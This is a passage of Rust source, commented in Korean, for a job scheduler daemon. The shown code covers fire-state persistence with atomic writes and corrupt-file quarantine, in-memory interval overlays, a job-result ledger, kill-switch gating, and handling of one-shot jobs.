        None => Vec::new(), // jobs 키 부재 = 빈 스케줄(정상)
        Some(j) => match serde_json::from_value::<Vec<Job>>(j.clone()) {
            Ok(v) => v,
            Err(e) => {
                // root는 유효 JSON이나 jobs 스키마 불일치 — 전체 격리는 않되(다른 키 보존 가능)
                // loud 신호로 무음 소실을 막는다. 스키마 점검이 필요한 운영 신호.
                eprintln!(
                    "[cysd] schedule.json 'jobs' 역직렬화 실패: {e} — 빈 스케줄(스키마 점검 필요)"
                );
                Vec::new()
            }
        },
    }
}

fn load_state(daemon: &Daemon) -> ScheduleState {
    let path = state_path(daemon);
    let content = match std::fs::read_to_string(&path) {
        Ok(c) => c,
        // 부재 = 정상(최초 가동). 기본 상태로 시작한다.
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return ScheduleState::default(),
        Err(e) => {
            eprintln!(
                "[cysd] schedule_state.json 읽기 실패({}): {e} — 기본 상태로 진행",
                path.display()
            );
            return ScheduleState::default();
        }
    };
    match serde_json::from_str::<ScheduleState>(&content) {
        Ok(s) => s,
        Err(e) => {
            // 손상 fire-state를 조용히 default로 대체하면 last_fired 소실 → 전 job 재발화.
            // 격리 + loud로 운영자가 인지하게 한다(재발화는 보고성 job엔 무해하나 신호는 남긴다).
            let note = match quarantine_corrupt(&path) {
                Some(b) => format!("손상본을 {}로 격리", b.display()),
                None => "손상본 격리 실패".to_string(),
            };
            eprintln!("[cysd] schedule_state.json 파싱 실패: {e} — {note}; 기본 상태로 진행");
            ScheduleState::default()
        }
    }
}

/// ★★디스크가 죽어도 **간격 의미를 지키는** 프로세스 메모리 오버레이(감사 확정 2026-08-16).
///
/// 왜 필요한가 — 스케줄러의 모든 안전성은 `schedule_state.json` 영속에 걸려 있었다. 쓰기가
/// 지속 실패하면(디스크 가득참·쿼터·읽기전용·권한) 매 tick 이 "처음"으로 보여 두 파국 중
/// 하나로 간다:
///   ①`last_fired` 가 영원히 비어 전 주기 잡이 **30초마다 재발화** → 마스터 stdin 폭주(앵커 ①②)
///   ②반쪽 쓰기(0바이트·잘림)가 남으면 손상 격리→재시드 루프로 **어느 잡도 영영 발화 안 함**(앵커 ③)
/// 어느 쪽도 허용할 수 없다. 그래서 발화 시각을 **메모리에도** 남기고, 매 tick 디스크 상태 위에
/// 덮어쓴다. 디스크가 정상이면 아무것도 달라지지 않고(같은 값), 죽어 있으면 이 프로세스가 사는
/// 동안 정확한 간격이 유지된다. 데몬 재시작 시 초기화되는 것은 의도된 한계다(그때는 디스크가
/// 유일한 진실이며, 재시작은 드물다).
fn mem_last_fired() -> &'static std::sync::Mutex<HashMap<String, i64>> {
    static MEM: std::sync::OnceLock<std::sync::Mutex<HashMap<String, i64>>> =
        std::sync::OnceLock::new();
    MEM.get_or_init(|| std::sync::Mutex::new(HashMap::new()))
}

fn mem_merge_into(state: &mut ScheduleState) {
    if let Ok(m) = mem_last_fired().lock() {
        for (k, v) in m.iter() {
            // 메모리가 더 최신이면 그것이 진실이다(디스크 쓰기 실패분을 복원).
            let cur = state.last_fired.get(k).copied().unwrap_or(0);
            if *v > cur {
                state.last_fired.insert(k.clone(), *v);
            }
        }
    }
}

fn mem_record(id: &str, ts: i64) {
    if let Ok(mut m) = mem_last_fired().lock() {
        m.insert(id.to_string(), ts);
    }
}

/// ★U4-B2①(0.14.41) 잡 1회 발화의 **결과 종류** — 드러내기 전용.
///
/// 왜 필요한가 — `last_fired` 는 발화 **전에** 기록된다(scheduler_tick). 그래서 매번 실패하는 주기
/// 자가치유 잡(formation-heartbeat·CSO 60분 점검 등)도 `cys schedule list` 에는 "제때 돌았다"로만
/// 보였고, 실패는 라우팅 밖 이벤트(`schedule.error`) 한 줄로 흘러가 사라졌다(앵커 ③ 가시성 0).
///
/// 다섯 갈래로 나누는 이유(반박 D2·D11):
///   · `Queued`  — 큐에 **적재만** 했다. 배달이 아니다(처분은 큐 배달자가 나중에 정한다).
///   · `Skipped` — 대상 부재(`if_absent=skip`)·부서 데몬의 base_only 잡. 오류는 아니지만 일도 안 했다.
///   · `Timeout` — 상한 만료. formation-heartbeat 의 600s 만료는 코드가 스스로 오보라 적는 갈래라
///     오류(exit≠0)와 섞으면 편성 폭풍 때 거짓 실패가 쌓인다 — 따로 센다.
/// 그래서 `ok` 는 **실제로 일을 끝낸 발화**뿐이다(적재·건너뜀을 성공으로 접으면 새 거짓 OK).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum JobResultKind {
    Ok,
    Skipped,
    Queued,
    Error,
    Timeout,
}

impl JobResultKind {
    fn as_str(self) -> &'static str {
        match self {
            JobResultKind::Ok => "ok",
            JobResultKind::Skipped => "skipped",
            JobResultKind::Queued => "queued",
            JobResultKind::Error => "error",
            JobResultKind::Timeout => "timeout",
        }
    }

    fn is_failure(self) -> bool {
        matches!(self, JobResultKind::Error | JobResultKind::Timeout)
    }
}

/// 원장 항목 수 상한(코드로 박힌 상한).
const JOB_RESULT_LEDGER_CAP: usize = 256;
/// `last_detail` 절단 길이(문자 수).
const JOB_RESULT_DETAIL_MAX_CHARS: usize = 200;

/// 잡 하나의 결과 기록. `consecutive_non_ok` = 마지막 `ok` 이후 연속(적재·건너뜀·실패 전부),
/// `consecutive_failures` = 연속 `error|timeout`(적재·건너뜀·성공이 끊는다).
#[derive(Clone, Debug, Default)]
struct JobResultEntry {
    last_result: Option<JobResultKind>,
    last_result_at: i64,
    last_ok_at: Option<i64>,
    last_detail: String,
    consecutive_non_ok: u64,
    consecutive_failures: u64,
}

/// ★결과 원장 — **프로세스 메모리 전용**(반박 D1 · 설계 §3 B2①).
///
/// `schedule_state.json` 에 싣지 않는 이유: 그 파일의 writer 는 scheduler_tick 하나이고 고정 tmp
/// 이름(`schedule_state.json.tmp`)을 잠금 없이 쓴다. `fire()` 는 별도 tokio 태스크(여러 개 동시)라
/// 여기서 쓰면 두 번째 동시 writer 가 생기고, 섞이거나 잘린 파일 → 손상 격리 → 재시드 루프(어느
/// 잡도 영영 발화 안 함 · 앵커 ③)라는 이 모듈이 스스로 경고한 계급이 다시 열린다. `schedule list`
/// 는 RPC(`schedule.status`)로 데몬 메모리를 읽으므로 메모리만으로 충분하다. 데몬 재시작 시 비는
/// 것은 의도된 한계다(그때는 "재시작 이후 발화 없음" = `-` 로 보인다).
/// 원장은 **발화 판정에 쓰이지 않는다**(발화 억제·지연 0 — 드러내기만). 좌석행 이벤트도 내지 않는다
/// (watchdog.* 새 발행자 금지 — 폐기 규약 D4).
#[derive(Debug, Default)]
struct JobResultLedger {
    entries: HashMap<String, JobResultEntry>,
}

impl JobResultLedger {
    fn record(&mut self, id: &str, kind: JobResultKind, detail: &str, now: i64) {
        if !self.entries.contains_key(id) && self.entries.len() >= JOB_RESULT_LEDGER_CAP {
            // 상한: 가장 오래 전에 기록된 항목부터 밀어낸다(원샷 잡 id 가 무한히 쌓이지 않게).
            if let Some(oldest) = self
                .entries
                .iter()
                .min_by_key(|(_, e)| e.last_result_at)
                .map(|(k, _)| k.clone())
            {
                self.entries.remove(&oldest);
            }
        }
        let e = self.entries.entry(id.to_string()).or_default();
        e.last_result = Some(kind);
        e.last_result_at = now;
        e.last_detail = detail.chars().take(JOB_RESULT_DETAIL_MAX_CHARS).collect();
        if kind == JobResultKind::Ok {
            e.last_ok_at = Some(now);
            e.consecutive_non_ok = 0;
        } else {
            e.consecutive_non_ok = e.consecutive_non_ok.saturating_add(1);
        }
        if kind.is_failure() {
            e.consecutive_failures = e.consecutive_failures.saturating_add(1);
        } else {
            e.consecutive_failures = 0;
        }
    }

    fn to_json(&self) -> serde_json::Value {
        let mut m = serde_json::Map::new();
        for (id, e) in &self.entries {
            m.insert(
                id.clone(),
                json!({
                    "last_result": e.last_result.map(|k| k.as_str()),
                    "last_result_at": e.last_result_at,
                    "last_ok_at": e.last_ok_at,
                    "last_detail": e.last_detail,
                    "consecutive_non_ok": e.consecutive_non_ok,
                    "consecutive_failures": e.consecutive_failures,
                }),
            );
        }
        serde_json::Value::Object(m)
    }

    #[cfg(test)]
    fn len(&self) -> usize {
        self.entries.len()
    }

    #[cfg(test)]
    fn get(&self, id: &str) -> Option<&JobResultEntry> {
        self.entries.get(id)
    }
}

/// 결과 원장 전역(프로세스 1개 · `mem_last_fired` 와 같은 OnceLock 관례).
fn job_result_ledger() -> &'static std::sync::Mutex<JobResultLedger> {
    static L: std::sync::OnceLock<std::sync::Mutex<JobResultLedger>> = std::sync::OnceLock::new();
    L.get_or_init(|| std::sync::Mutex::new(JobResultLedger::default()))
}

/// 발화 결과 1건 기록 — 잠금이 poison 이어도 패닉하지 않는다(관측이 발화 태스크를 죽이면 안 된다).
fn record_job_result(id: &str, kind: JobResultKind, detail: &str) {
    let now = Local::now().timestamp();
    let mut g = job_result_ledger().lock().unwrap_or_else(|e| e.into_inner());
    g.record(id, kind, detail, now);
}

/// `fire_push`·`fire_command` 의 반환을 다섯 갈래로 나눈다(순수 · 회귀 핀).
/// 판독 문안은 생산자 문안 그대로다 — `classify_fire_result_matches_producer_wording` 이 대조한다.
fn classify_fire_result(result: &Result<String, String>) -> JobResultKind {
    match result {
        // 상한 만료 문안은 **접두**로만 본다 — 실패한 명령의 stderr 꼬리에 "timed out" 이 섞여도
        // (예: curl) 그것은 명령 자신의 오류(error)다.
        Err(e)
            if e.starts_with("command timed out")
                || e.starts_with("launch-agent timed out")
                || e.starts_with("text_command 30초 타임아웃") =>
        {
            JobResultKind::Timeout
        }
        Err(_) => JobResultKind::Error,
        Ok(d) if d.starts_with("skipped:") => JobResultKind::Skipped,
        // ★review1 m7 FIX: 접두를 `"queued "`(공백 포함) 대신 `"queued"`(공백 없이)로 넓힌다 —
        // WP-B4(별도 워크트리 `wp41-B4`)가 `deliver_push`에 `"queued(modal) to …"`를 추가하면,
        // 통합 뒤 모달 우회 직접 push 결과 문안이 공백 없는 `queued(` 로 시작해 종전 `"queued "` 접두에
        // 걸리지 않고 `Ok(_) => Ok` 로 새어(정상 큐 적재가 "성공"으로 오분류) CSO 표시를 왜곡한다.
        // `"queued"` 로 넓혀도 그 뒤에 다른 생산자 문안이 없어 새 오분류가 생기지 않는다(아래 소스 핀).
        Ok(d) if d.starts_with("queued") || d.starts_with("fresh-launched and queued") => {
            JobResultKind::Queued
        }
        Ok(_) => JobResultKind::Ok,
    }
}

/// 상태 저장 — **원자쓰기(tmp+rename)** 로 반쪽 파일을 남기지 않는다(ensure_builtin_jobs 관례와 동일).
/// 종전 `fs::write` 는 create(성공)+write_all(실패) 사이에서 **0바이트 파일**을 남길 수 있었고,
/// 그 파일은 다음 tick 에 파싱 실패→손상 격리→재시드 루프의 씨앗이 됐다.
/// 반환값으로 성공 여부를 알린다(호출부가 '영속됐다'를 exists() 로 오판하지 않도록).
fn save_state(daemon: &Daemon, state: &ScheduleState) -> std::io::Result<()> {
    save_state_to(&state_path(daemon), state)
}

/// 경로 주입판(테스트 가능) — 위 함수의 본체.
fn save_state_to(path: &std::path::Path, state: &ScheduleState) -> std::io::Result<()> {
    let body = serde_json::to_string_pretty(state)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
    let tmp = path.with_extension("json.tmp");
    {
        use std::io::Write;
        let mut f = std::fs::File::create(&tmp)?;
        f.write_all(body.as_bytes())?;
        f.sync_all()?;
    }
    std::fs::rename(&tmp, path)
}

/// 주기 job 발화 판정 — 순수 함수(회귀 핀). 마지막 발화 후 every_minutes분 경과 시 true.
/// every_minutes None·0은 비활성(상시발화 방지). last_fired=0(최초)는 epoch 차가 커 즉시 발화.
fn interval_due(every_minutes: Option<u64>, last_fired: i64, now_ts: i64) -> bool {
    match every_minutes {
        // ★미래 last_fired 방어(감사 확정): 첫 부팅이 시각 동기화 전이라 벽시계가 미래로 튀면
        // 그 값이 박제되고, 시각이 교정된 뒤에는 `now - last` 가 영원히 음수라 **주기 잡이
        // 영구 침묵**한다. 미래 기록은 신뢰할 수 없으므로 즉시 만기로 취급해 리듬을 되찾는다.
        Some(m) if m > 0 => last_fired > now_ts || now_ts - last_fired >= (m as i64) * 60,
        _ => false,
    }
}

/// 해당 날짜가 job의 실행 요일인가 + 그 날짜의 예정 시각(epoch)을 계산.
/// DST 모호/비존재 시각은 earliest로 보정 — 해당일 job이 무음 소멸하지 않는다.
fn schedule_for(job: &Job, date: chrono::NaiveDate) -> Option<i64> {
    if !job.days.is_empty() {
        let dow = match date.weekday() {
            chrono::Weekday::Mon => "mon",
            chrono::Weekday::Tue => "tue",
            chrono::Weekday::Wed => "wed",
            chrono::Weekday::Thu => "thu",
            chrono::Weekday::Fri => "fri",
            chrono::Weekday::Sat => "sat",
            chrono::Weekday::Sun => "sun",
        };
        if !job.days.iter().any(|d| d.eq_ignore_ascii_case(dow)) {
            return None;
        }
    }
    let t = NaiveTime::parse_from_str(job.time.as_deref()?, "%H:%M").ok()?;
    let dt = date.and_time(t);
    let local = Local.from_local_datetime(&dt);
    local
        .single()
        .or_else(|| local.earliest())
        .map(|d| d.timestamp())
}

pub fn spawn_scheduler(daemon: Arc<Daemon>) {
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(TICK_SECS)).await;
            // 패닉 격리: 한 틱의 패닉이 scheduler 태스크를 죽여 하트비트 발화가
            // 데몬 수명 내내 조용히 멈추는 것을 막는다. (fire는 별도 태스크라 자체 격리)
            let tick = std::panic::AssertUnwindSafe(|| scheduler_tick(&daemon));
            if std::panic::catch_unwind(tick).is_err() {
                daemon.bus.publish(
                    "schedule.tick_panic",
                    "schedule",
                    None,
                    json!({"note": "scheduler tick panicked; continuing next tick"}),
                );
            }
        }
    });
}

/// scheduler 루프의 동기 틱 본문 — 패닉 격리 경계 안에서 호출된다.
fn scheduler_tick(daemon: &Arc<Daemon>) {
    // T4-15 kill-switch: pause 중에는 발화 동결 (재개 후 600초 초과분은 missed 처리)
    if daemon.paused.load(std::sync::atomic::Ordering::Relaxed) {
        return;
    }
    let jobs = load_jobs_hot_reload(); // 핫 리로드: CLI가 schedule.json만 고치면 됨 · 이 틱이 유일한 데몬 writer 자리다
    if jobs.is_empty() {
        return;
    }
    let now = Local::now();
    let now_ts = now.timestamp();
    let mut state = load_state(daemon);
    state.schema_version = SCHEDULE_STATE_VERSION; // 구파일(0) → 현재 버전 스탬프(다음 save 시 영속)
    // ★디스크 쓰기가 실패해도 간격을 지키도록 메모리 기록을 먼저 덮는다(mem_last_fired 주석 참조).
    mem_merge_into(&mut state);
    let mut dirty = false;
    // ★P2-2 ⑥(완전 초기화 시뮬레이션 확정 2026-08-16): 상태 파일이 **없는 첫 가동**(신규 설치·
    // 완전 초기화 직후)에는 last_fired 가 0이라 전 주기 잡의 만기가 **동시에** 성립한다. 그러면
    // ①마스터가 있으면 6h·24h·주간 잡이 한꺼번에 주입돼 갓 각성한 마스터를 큐로 덮치고(폭주 결함군)
    // ②마스터가 없으면 `if_absent: skip` 으로 전부 소인돼 다음 주기까지 침묵한다 — 어느 쪽도 의도가
    // 아니다. 첫 가동에는 시계를 **지금**으로 맞춰 다음 주기부터 정상 리듬을 타게 한다.
    // 실패 방향: 첫 주기 1회가 늦어질 뿐(보고성 잡이라 무해). 상태 파일이 있으면 전혀 관여하지 않는다.
    // ★★fail-safe 방향 고정(부트 체인 불가침): 시드를 **디스크에 남기지 못하면 채택하지 않는다**.
    // 이 순서가 계약인 이유 — 시드를 메모리에만 적용하고 save_state 가 실패하면(디스크 가득참·
    // 권한·경로 소실) 매 tick 이 다시 "첫 가동"으로 보여 last_fired 가 영원히 now 로 리셋되고,
    // 그러면 **주기 자가치유 잡이 영영 발화하지 않는다**(무발화 침묵 = 마스터가 바보가 되는 그 결함).
    // 저장 실패 시에는 종전 의미(last_fired=0 → 즉시 만기)로 되돌린다: 잡이 한 번에 몰리는 쪽이
    // 영원히 안 도는 쪽보다 **압도적으로 덜 위험하다**(전자는 시끄럽고 후자는 조용히 죽는다).
    // ★손상 격리를 '첫 가동'으로 오인하지 않는다(감사 확정): load_state 가 손상본을
    // `<name>.corrupt-<epoch>` 로 rename 하면 원본 자리가 비어 '처음'처럼 보인다. 그 상태에서
    // 시드하면 **몇 달 된 기계의 전 주기 잡 시계가 통째로 리셋**되고 로그도 거짓말을 한다.
    // 격리 흔적(형제 .corrupt-* 파일)이 하나라도 있으면 첫 가동이 아니다.
    let had_corrupt = state_path(daemon)
        .parent()
        .and_then(|d| std::fs::read_dir(d).ok())
        .map(|rd| {
            rd.flatten().any(|e| {
                e.file_name()
                    .to_string_lossy()
                    .starts_with("schedule_state.json.corrupt-")
            })
        })
        .unwrap_or(false);
    if state.last_fired.is_empty() && !state_path(daemon).exists() && !had_corrupt {
        let mut seeded: HashMap<String, i64> = HashMap::new();
        for job in jobs.iter().filter(|j| j.every_minutes.is_some()) {
            // ★복구 소스를 만드는 잡(phoenix 세대 스냅샷)은 **시드하지 않는다** — 시드하면
            // 첫 6시간 동안 롤백 세대가 0이라, 그 사이 손상되면 치유 소스가 아예 없다.
            // 한 잡이 부팅 직후 1회 도는 것은 '몰림'이 아니다(동시 만기 방지가 목적이었다).
            if job.id.starts_with("phoenix-snapshot") {
                continue;
            }
            seeded.insert(job.id.clone(), now_ts);
        }
        if !seeded.is_empty() {
            // ★시드는 **메모리에 먼저** 박는다 — 디스크 성패와 무관하게 이 프로세스에서는
            // 재시드가 다시 일어나지 않는다(재시드 루프 = 주기 잡 영구 침묵의 원인).
            for (k, v) in &seeded {
                mem_record(k, *v);
            }
            state.last_fired = seeded;
            let probe = ScheduleState {
                schema_version: SCHEDULE_STATE_VERSION,
                last_fired: state.last_fired.clone(),
            };
            match save_state(daemon, &probe) {
                Ok(()) => eprintln!(
                    "[cysd] schedule: 첫 가동 — 주기 잡 {}개의 기준 시각을 now 로 초기화(동시 만기 방지)",
                    state.last_fired.len()
                ),
                Err(e) => eprintln!(
                    "[cysd] schedule: 첫 가동 시드 영속 실패({}: {e}) — 메모리 기록으로 간격을 유지한다\
                     (데몬 재시작 전까지 유효). 디스크 쓰기 문제를 해결하라.",
                    state_path(daemon).display()
                ),
            }
        }
    }
    let today = now.date_naive();
    for job in jobs {
        // 주기(every_minutes) job: 마지막 발화 후 N분 경과 시 반복 발화 (master 5분 보고 하트비트).
        // at·time보다 먼저 평가하고, 처리 후 다음 job으로 (배타).
        // 재시작 안전성: last_fired는 발화 직후 기록되고 dirty 시 save_state로 영속된다.
        // save_state 직전 비정상 종료 시 재시작 후 1회 추가 발화가 가능하나, 보고성 job은
        // 중복 발화를 허용한다(누락이 더 해롭다 — '보고가 한 번 더'는 무해).
        if job.every_minutes.is_some() {
            let last = state.last_fired.get(&job.id).copied().unwrap_or(0);
            if interval_due(job.every_minutes, last, now_ts) {
                state.last_fired.insert(job.id.clone(), now_ts);
                mem_record(&job.id, now_ts); // 디스크 실패해도 다음 tick 이 간격을 지킨다.
                dirty = true;
                let d = Arc::clone(daemon);
                let j = job.clone();
                tokio::spawn(async move { fire(d, j).await });
            }
            continue;
        }
        // T3-10 원샷(at) job: 도달 시 1회 발화 후 파일에서 제거
        if let Some(at) = job.at {
            if now_ts < at {
                continue;
            }
            if state.last_fired.get(&job.id).copied().unwrap_or(0) >= at {
                continue;
            }
            state.last_fired.insert(job.id.clone(), at);
            dirty = true;
            if now_ts - at > MISS_WINDOW_SECS {
                daemon.bus.publish(
                    "schedule.missed",
                    "schedule",
                    None,
                    json!({"job_id": job.id, "scheduled_at": at, "late_secs": now_ts - at}),
                );
            } else {
                let d = Arc::clone(daemon);
                let j = job.clone();
                tokio::spawn(async move { fire(d, j).await });
            }
            remove_job_from_file(&job.id);
            continue;
        }
        // 어제 인스턴스도 평가 — 자정 경계에서 전날 미처리분이
        // fire도 schedule.missed도 없이 무음 소멸하는 것을 막는다
        let mut dates = vec![today];
        if let Some(yesterday) = today.pred_opt() {
            dates.insert(0, yesterday);
        }
        for date in dates {
            let Some(sched_ts) = schedule_for(&job, date) else {
                continue;
            };
            if now_ts < sched_ts {
                continue;
            }
            if state.last_fired.get(&job.id).copied().unwrap_or(0) >= sched_ts {
                continue; // 이미 처리
            }
            state.last_fired.insert(job.id.clone(), sched_ts);
            dirty = true;
            if now_ts - sched_ts > MISS_WINDOW_SECS {
                daemon.bus.publish(
                    "schedule.missed",
                    "schedule",
                    None,
                    json!({"job_id": job.id, "scheduled_at": sched_ts,
                                   "late_secs": now_ts - sched_ts}),
                );
                continue;
            }
            let d = Arc::clone(daemon);
            let job = job.clone();
            tokio::spawn(async move { fire(d, job).await });
        }
    }
    if dirty {
        if let Err(e) = save_state(daemon, &state) {
            // 조용히 삼키지 않는다 — 이 실패가 지속되면 재시작 시 간격이 초기화된다.
            eprintln!("[cysd] schedule: 상태 저장 실패({e}) — 메모리 기록으로 계속 진행");
        }
    }
}

/// 원샷 잡 제거의 **순수 코어**(회귀 핀 대상).
///
/// ★(0.14.31 · 수렴 R2 · triage X8 잔여) 이 자리는 **원시 JSON 을 되쓰는** 경로다 — 남은 잡을
/// 읽은 그대로 쓰면 운영자가 손으로 넣은 `action:"push" + via_queue:true` 가 디스크에 그대로
/// 다시 영속된다(원샷 잡 하나가 끝날 때마다). 강등된 구 데몬은 그 표현을 `push` 로 읽고 큐
/// 준비 게이트를 통째 우회해 직접 주입한다. 쓰기 전에 같은 정규형으로 접는다.
fn drop_job_and_canonicalize(root: &mut serde_json::Value, job_id: &str) {
    if let Some(arr) = root["jobs"].as_array_mut() {
        arr.retain(|j| j["id"].as_str() != Some(job_id));
        canonicalize_stored_queue_actions(arr);
    }
}

/// T3-10: 처리 완료된 원샷 job을 schedule.json에서 제거 (영구 잔존 차단)
fn remove_job_from_file(job_id: &str) {
    remove_job_from_file_at(&schedule_path(), job_id);
}

/// 경로 주입판 — ★(성찰 A11) writer 잠금 아래에서 읽고·빼고·쓴다(읽기와 치환 사이의 CLI 추가 보존).
fn remove_job_from_file_at(path: &std::path::Path, job_id: &str) {
    let Some(_lock) = ScheduleFileLock::acquire(path) else {
        eprintln!("[cysd] schedule: 원샷 잡 '{job_id}' 제거 — writer 잠금을 잡지 못했다 · 다음 틱이 다시 시도한다");
        return;
    };
    let Ok(content) = std::fs::read_to_string(path) else {
        return;
    };
    let Ok(mut root) = serde_json::from_str::<serde_json::Value>(&content) else {
        return;
    };
    drop_job_and_canonicalize(&mut root, job_id);
    // 원자 치환 — 부분 쓰기가 핫리로드에 잡히면 스케줄 전체가 빈 스케줄로 읽힌다.
    if !write_schedule_atomic(path, &root) {
        eprintln!("[cysd] schedule: 원샷 잡 '{job_id}' 제거 기록 실패 — 다음 틱이 다시 시도한다");
    }
}

/// ★(0.14.42 · R3SH-5 ②) 동결로 끝난 원샷 잡을 파일에 되돌린다(`at + 1`). 같은 id 가 이미 있으면(사람이 다시 넣음) 손대지
/// 않는다. 원샷이 아니면 무동작. 실패는 이벤트로 드러낸다(침묵 금지).
fn requeue_oneshot_after_frozen(daemon: &Arc<Daemon>, job: &Job) {
    requeue_oneshot_after_frozen_at(daemon, &schedule_path(), job)
}

fn requeue_oneshot_after_frozen_at(daemon: &Arc<Daemon>, path: &std::path::Path, job: &Job) {
    let Some(at) = job.at else { return };
    if job.every_minutes.is_some_and(|m| m > 0) {
        return;
    }
    let mut back = job.clone();
    back.at = Some(at.saturating_add(1));
    let ok = (|| {
        let _lock = ScheduleFileLock::acquire(path)?;
        let mut root: serde_json::Value = std::fs::read_to_string(path)
            .ok()
            .and_then(|c| serde_json::from_str(&c).ok())
            .unwrap_or_else(|| json!({"jobs": []}));
        if !root["jobs"].is_array() {
            root["jobs"] = json!([]);
        }
        let arr = root["jobs"].as_array_mut()?;
        if arr.iter().any(|j| j["id"].as_str() == Some(back.id.as_str())) {
            return Some(true);
        }
        arr.push(serde_json::to_value(&back).ok()?);
        canonicalize_stored_queue_actions(arr);
        write_schedule_atomic(path, &root).then_some(true)
    })()
    .unwrap_or(false);
    daemon.bus.publish(
        "schedule.oneshot_requeued",
        "schedule",
        None,
        json!({"job_id": job.id, "at": back.at, "ok": ok,
               "note": if ok { "kill-switch 경합으로 동결된 원샷을 파일에 되돌렸다 — 해제 뒤 다음 틱이 다시 발화한다" }
                       else { "동결된 원샷을 파일에 되돌리지 못했다(잠금·쓰기 실패) — 이 wake 는 다시 오지 않는다 · 수동 재등록 필요" }}),
    );
}

/// 즉시 발화 (CLI `schedule run-now` — 검증용, last_fired 갱신 없음)
pub fn run_now(daemon: &Arc<Daemon>, job_id: &str) -> Result<(), String> {
    // T4-15 kill-switch: pause 중에는 즉발도 동결 — scheduler_tick과 동일한 게이트.
    // run_now는 fire()로 동일한 스케줄 발화(에이전트 stdin 주입·fresh surface 기동)를
    // 수행하므로, 이 경로만 게이트가 없으면 kill-switch가 비대칭으로 뚫린다.
    // RPC 호출이라 무음 return 대신 거절 사유를 caller에 알린다.
    if daemon.paused.load(std::sync::atomic::Ordering::Relaxed) {
        return Err("paused: kill-switch engaged (system.resume to re-enable firing)".to_string());
    }
    let job = load_jobs()
        .into_iter()
        .find(|j| j.id == job_id)
        .ok_or_else(|| format!("no job '{job_id}' in {}", schedule_path().display()))?;
    let d = Arc::clone(daemon);
    tokio::spawn(async move { fire(d, job).await });
    Ok(())
}

/// ★T9(R3-P03-3): base 전용 잡의 부서 데몬 발화 차단 판정(순수 — 회귀 핀 대상).
/// fire() 진입부가 유일 관문인 이유: scheduler_tick·run_now·핫리로드·파일 복제(부서 팩에
/// builtin 이 복제 기록되는 기지 소음) 전 경로가 fire 로 수렴한다 — ensure/seed 시점 가드로는
/// cys-dept 미경유 재기동(클라이언트 autostart)을 막지 못한다. 셸 env 가드([ -n "$CYS_SOCKET" ])
/// 는 판별자로 부적격(GUI ensure_daemon 이 base cysd 를 env_remove 없이 스폰) — 판별은
/// 데몬 자신의 socket_path(is_dept_socket) 하나다.
fn base_only_blocked(job: &Job, socket_path: &std::path::Path) -> bool {
    job.base_only && cys::is_dept_socket(socket_path)
}

async fn fire(daemon: Arc<Daemon>, job: Job) {
    // ★T9 단일 관문: base_only 잡이 부서 소켓 데몬에서 발화하려 하면 skip + 사유 이벤트 1줄.
    // (예: 상비편성 심박이 부서 데몬에서 돌면 전 부서 이중 ensure — 단일소유 위반.)
    if base_only_blocked(&job, &daemon.socket_path) {
        daemon.bus.publish(
            "schedule.skipped",
            "schedule",
            None,
            json!({"job_id": job.id, "why": "base_only job on dept socket — skip (T9/R3-P03-3)"}),
        );
        record_job_result(&job.id, JobResultKind::Skipped, "base_only job on dept socket");
        return;
    }
    let result = match job.action.as_str() {
        // ★(0.14.31 · 리뷰 R1 · codex blocking) `push_queued` 는 **큐 경유가 계약인 push** 다.
        //   `action:"push"` + `via_queue:true` 로만 표현하면 구 데몬(강등·롤백)이 미지 필드를
        //   무시하고 **직접 주입**한다 — 초안·승인 대기 화면에 글자와 Return 이 꽂힌다.
        //   구 데몬은 이 action 을 모르므로 `unknown action` 으로 **거절**한다(주입 0 · 안전 방향).
        "push" | ACTION_PUSH_QUEUED => fire_push(&daemon, &job).await,
        "command" => fire_command(&daemon, &job).await,
        other => Err(format!("unknown action '{other}'")),
    };
    // ★(0.14.42 · R3SH-5 ②) 틱의 pause 확인과 push 사이에 kill-switch 가 켜져 원샷(`at`)이 동결로 끝났다 — 그 잡은 틱이
    //   이미 파일에서 지웠으므로 여기서 끝내면 pause 를 풀어도 되살아나지 않는다(자기 예약 wake 유실). 파일에 되돌려
    //   해제 뒤 다음 틱이 다시 발화하게 한다(at+1 — 틱의 메모리 기록 `last_fired ≥ at` 을 넘기기 위한 1초).
    //   pause 로 덮인 원샷의 종전 규약(해제 뒤 발화 · MISS_WINDOW 넘으면 missed)과 같아진다.
    if matches!(&result, Err(e) if e == SCHEDULE_FROZEN_ERR) {
        requeue_oneshot_after_frozen(&daemon, &job);
    }
    // ★U4-B2① 결과 원장(메모리 전용) — 이벤트 발행과 독립으로 남는다(이벤트는 흘러가 사라진다).
    let kind = classify_fire_result(&result);
    match &result {
        Ok(d) | Err(d) => record_job_result(&job.id, kind, d),
    }
    match result {
        Ok(detail) => daemon.bus.publish(
            "schedule.fired",
            "schedule",
            None,
            json!({"job_id": job.id, "action": job.action, "detail": detail, "at": now_epoch()}),
        ),
        Err(e) => daemon.bus.publish(
            "schedule.error",
            "schedule",
            None,
            json!({"job_id": job.id, "error": e}),
        ),
    }
}

/// fresh surface를 발화 후 자동 close하기까지의 TTL(초)을 결정한다.
/// - close_after_secs 명시 → 그 값 우선(0 포함 — 운영자 의도 존중)
/// - 미설정 + 반복 job(time 또는 every_minutes) → 누수 차단 기본 TTL (반복 발화는 surface가
///   단조 누적되므로 회수 트리거 부재 시 자동 close 필요). at이 None인 모든 반복형에 적용된다.
/// - 미설정 + 원샷(at) job → None (1회뿐이라 무한 누적 없음 — 기존 동작 보존)
fn effective_close_ttl(job: &Job) -> Option<u64> {
    if let Some(ttl) = job.close_after_secs {
        // ★(0.14.31 · 독립 판정 triage X9) **큐 경유 배달은 준비 게이트를 기다린다.**
        //   `close_after_secs: 0` 은 그대로 `Some(0)` 이라 회수 타이머가 배달 게이트가 열리기
        //   전에 돌고, `close_surface` 는 활성 큐를 폐기한다(governance `drain_active_except_inflight`)
        //   — 적재된 일감이 배달 전에 사라진다. 큐가 계약인 잡에는 **하한**을 둔다: 회수가
        //   배달 시도보다 앞설 수 없게 만드는 최소 창이다(운영자의 0 은 "가능한 한 빨리" 이지
        //   "배달 전에" 가 아니다). 처분이 정해질 때까지의 실제 유예는 호출부가 따로 진다.
        if job.uses_queue() {
            return Some(ttl.max(QUEUED_CLOSE_MIN_TTL_SECS));
        }
        return Some(ttl);
    }
    if job.at.is_none() {
        return Some(FRESH_RECURRING_DEFAULT_TTL_SECS);
    }
    None
}

